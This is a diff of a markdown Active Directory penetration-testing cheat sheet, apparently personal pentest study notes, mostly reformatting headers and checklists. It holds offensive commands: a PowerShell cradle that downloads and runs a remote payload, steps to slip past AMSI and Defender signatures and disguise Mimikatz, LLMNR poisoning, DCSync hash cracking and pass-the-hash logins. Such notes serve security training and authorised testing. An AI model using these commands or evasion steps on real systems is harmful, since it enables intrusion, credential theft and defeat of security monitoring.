@@ -133,10 +133,7 @@ When you compromise a Domain Controller, you want to be able to get the ntds.dit
 
 **Common Terminology**
 - AD Component: trees, forest, domain tree, domain forest
-  https://techiepraveen.wordpress.com/2010/09/04/basic-active-directory-components/
-- https://tryhackme.com/room/attackingkerberos  Task 1
-- More resources:
-  https://tryhackme.com/room/attackingkerberos  Task 9
+  - [Basic Active Directory Components: Architecture and Design](https://techiepraveen.wordpress.com/2010/09/04/basic-active-directory-components/)
 
 **ACEs**
 - ForceChangePassword: We have the ability to set the user's current password without knowing their current password.
@@ -148,14 +145,12 @@ When you compromise a Domain Controller, you want to be able to get the ntds.dit
 - AllExtendedRights: We have the ability to perform any action associated with extended AD rights against the target object. This includes, for example, the ability to force change a user's password.
 - The highest permission is `GenericAll`. Note also `GenericWrite`, `WriteOwner`, `WriteDACL`, `AllExtendedRights`, `ForceChangePassword`, `Self (Self-Membership)`
 
-
 **Services that can be configured for delegation**
 - HTTP - Used for web applications to allow pass-through authentication using AD credentials.
 - CIFS - Common Internet File System is used for file sharing that allows delegation of users to shares.
 - LDAP - Used to delegate to the LDAP service for actions such as resetting a user's password.
 - HOST - Allows delegation of account for all activities on the host.
 - MSSQL - Allows delegation of user accounts to the SQL service for pass-through authentication to databases.
-
 
 **Basics commands**
 - Perform a password reset
@@ -164,7 +159,6 @@ When you compromise a Domain Controller, you want to be able to get the ntds.dit
   - `Set-ADUser -ChangePasswordAtLogon $true -Identity <UserName> -Verbose`
 
 **Work with modules and scripts**
-
 Import a `.psd1` script (get all the commands from a module with `Get-Command -module <name-module>`)
 - `Import-Module script.psd1`
 - `iex (New-Object Net.WebClient).DownloadString('https://<IP>/payload.ps1')`
@@ -175,26 +169,26 @@ Import a `.psd1` script (get all the commands from a module with `Get-Command -m
   `$r = $wr.GetResponse()`<br/>
   `IEX (System.IO.StreamReader).ReadToEnd()`
 
-PowerShell Detections
+**PowerShell Detections**
 - System-wide transcription
 - Script Block logging
 - AntiMalware Scan Interface (AMSI)
 - Constrained Language Mode (CLM) - Integrated with Applocker and WDAC (Device Guard)
 
-PowerShell Detections bypass
+**PowerShell Detections bypass**
 - Use [Invisi-Shell](https://github.com/OmerYa/Invisi-Shell) for bypassing the security controls in PowerShell
 - [AMSITrigger](https://github.com/RythmStick/AMSITrigger) tool to identify the exact part of a script that is detected as malicious: `AmsiTrigger_x64.exe -i C:\AD\Tools\Invoke-PowerShellTcp_Detected.ps1`
 - [DefenderCheck](https://github.com/t3hbb/DefenderCheck) to identify code and strings from a binary / file that Windows Defender may flag: `DefenderCheck.exe PowerUp.ps1`
 - For full obfuscation of PowerShell scripts, see [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation)
 - See [Amsi-Bypass-Powershell](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)
 
-Steps to avoid signature based detection:
+**Steps to avoid signature based detection**
 1. Scan using AMSITrigger
 2. Modify the detected code snippet
 3. Rescan using AMSITrigger
 4. Repeat the steps 2 & 3 till we get a result as "AMSI_RESULT_NOT_DETECTED" or "Blank"
 
-For Mimikatz, make the following changes:
+**For Mimikatz, make the following changes**
 1. Remove default comments
 2. Rename the script, function names and variables
 3. Modify the variable names of the Win32 API calls that are detected
@@ -249,12 +243,13 @@ For Mimikatz, make the following changes:
 
 
 ## Initial foothold
-- run `responder` + `mitm6`
-- `enum4linux -a -u "" -p "" <IP>`
-- `nmap -Pn -T4 -p- --min-rate=1000 -sV -vvv <IP> -oN nmap_results`
-- `nmap -p- -A -nP <IP> -oN nmap_results`
-- `dig @<IP> AXFR <domain>`
-- `dnsenum <IP>`
+- [ ] run `responder` + `mitm6`
+- [ ] Scans to run
+  - `enum4linux -a -u "" -p "" <IP>`
+  - `nmap -Pn -T4 -p- --min-rate=1000 -sV -vvv <IP> -oN nmap_results`
+  - `nmap -p- -A -nP <IP> -oN nmap_results`
+  - `dig @<IP> AXFR <domain>`
+  - `dnsenum <IP>`
 - After this
   - [ ] 53, zone transfer + info collection
   - [ ] 139/445 Check SMB / smbclient
@@ -294,23 +289,22 @@ For Mimikatz, make the following changes:
     - ldap
 - Access to the domain
   - [ ] Use [Invisi-Shell](https://github.com/OmerYa/Invisi-Shell) to bypass the security controls in PowerShell
+  - [ ] See [#Notes](#notes) for Cheat sheets and detections bypasses
 - PrivEsc / Post Access
-  - [ ] enumerate with bloodhound, powershell, powerview
+  - [ ] Enumerate with bloodhound, powershell, powerview
   - [ ] Check privileges
     - whoami /priv, Get-ADUser -identity <username> -properties *
-  - [ ] try access with rdp
-  - [ ] mimikatz.exe
-  - [ ] test creds already found
+  - [ ] Try access with RDP
+  - [ ] Mimikatz
+  - [ ] Test creds already found
     - crackmapexec, ldap with auth, enum4linux (see descriptions), smbclient
     - kerberoast (AS-REP, Kerberost, Rubeus, etc. -> retrieve TGS)
     - secrets dump, impacket-psexec, impacket-wmiexec, evil-winrm
     - test also hashes
-  - [ ] Azure
-  - [ ] Play with Rubeus
-  - [ ] See DCSync (try with various tools, come aclpwn)
-  - [ ] See all sections of this document
-  - [ ] See powershell history
+  - [ ] See PowerShell history
   - [ ] Run Seatbelt first, then winPEAS
+  - [ ] See all sections of this document
+ 
 
 
 ## Manual Enumeration
@@ -833,7 +827,7 @@ On Windows
 2. Crack the NTLM hash with `hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`
 
 Another way
-- with [aclpwn.py](https://github.com/fox-it/aclpwn.py), `python aclpwn.py -f svc-alfresco -t <target_domain> --domain <domain> --server <IP> -du <domain_user> -dp <domain_password>`
+- With [aclpwn.py](https://github.com/fox-it/aclpwn.py), `python aclpwn.py -f <username> -t <target_domain> --domain <domain> --server <IP> -du <domain_user> -dp <domain_password>`
 
 Connect with NTLM
 - `evil-winrm -u Administrator -H '<NTLM_hash>' -i <IP> -N`
